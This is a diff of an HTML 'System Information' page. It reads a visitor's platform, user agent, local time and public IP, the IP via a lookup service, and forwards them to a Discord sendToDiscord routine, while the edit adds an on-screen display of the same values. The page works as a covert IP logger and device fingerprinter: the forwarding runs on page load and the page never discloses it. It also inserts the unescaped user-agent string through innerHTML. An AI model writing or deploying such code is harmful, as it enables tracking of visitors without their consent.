@@ -7,55 +7,32 @@
 </head>
 <body>
     <h1>System Information</h1>
-    <div id="output"></div>
+    <div id="output">
+        <p id="os">OS: </p>
+        <p id="browser">Browser: </p>
+        <p id="time">Current Time (EST): </p>
+        <p id="public-ip">Public IP: </p>
+    </div>
 
     <script>
         async function getOsInfo() {
-            return "OS: Linux 5.15.0-91-generic";
+            return navigator.platform;
         }
 
         async function getBrowserInfo() {
-            return "Browser: " + navigator.userAgent;
+            return navigator.userAgent;
         }
 
         function getTimeInfo() {
             const estTime = new Date().toLocaleString("en-US", {timeZone: "America/New_York"});
-            return "Current Time (EST): " + estTime;
+            return estTime;
         }
 
         async function getPublicIp() {
             const publicIp = await fetch('https://api64.ipify.org?format=json')
                                 .then(response => response.json())
                                 .then(data => data.ip);
-            return "Public IP: " + publicIp;
-        }
-
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                const batteryLevel = battery.level * 100;
-                const batteryStatus = battery.charging ? "Plugged in" : "Not Plugged in";
-                return "Battery: " + batteryLevel.toFixed(2) + "% (" + batteryStatus + ")";
-            } else {
-                return "Battery: Information not available";
-            }
-        }
-
-        async function getGpuInfo() {
-            // Code to get GPU information (if available)
-            return "GPU: None found";
-        }
-
-        function getCpuInfo() {
-            return "CPU: " + navigator.platform;
-        }
-
-        async function getStorageInfo() {
-            // Code to get storage information
-            const totalSpace = 14.09; // Total space in GB
-            const usedSpace = 10.07; // Used space in GB
-            const freeSpace = totalSpace - usedSpace; // Free space in GB
-            return `Storage: ${usedSpace.toFixed(2)} GB used, ${freeSpace.toFixed(2)} GB free (Total: ${totalSpace.toFixed(2)} GB)`;
+            return `<a href="https://whatismyipaddress.com/ip/${publicIp}" target="_blank">${publicIp}</a>`;
         }
 
         async function sendToDiscord(message) {
@@ -75,15 +52,14 @@
                 const browserInfo = await getBrowserInfo();
                 const timeInfo = getTimeInfo();
                 const publicIp = await getPublicIp();
-                const batteryInfo = await getBatteryInfo();
-                const gpuInfo = await getGpuInfo();
-                const cpuInfo = getCpuInfo();
-                const storageInfo = await getStorageInfo();
 
-                const message = `${osInfo}\n${browserInfo}\n${timeInfo}\n${publicIp}\n${batteryInfo}\n${gpuInfo}\n${cpuInfo}\n${storageInfo}`;
+                document.getElementById('os').innerHTML += osInfo;
+                document.getElementById('browser').innerHTML += browserInfo;
+                document.getElementById('time').innerHTML += timeInfo;
+                document.getElementById('public-ip').innerHTML += publicIp;
+
+                const message = `${osInfo}\n${browserInfo}\n${timeInfo}\n${publicIp}`;
                 await sendToDiscord(message);
-
-                outputDiv.textContent = 'Data sent successfully!';
             } catch (error) {
                 console.error('Error:', error);
                 outputDiv.textContent = 'Error: ' + error;
@@ -94,4 +70,3 @@
     </script>
 </body>
 </html>
-
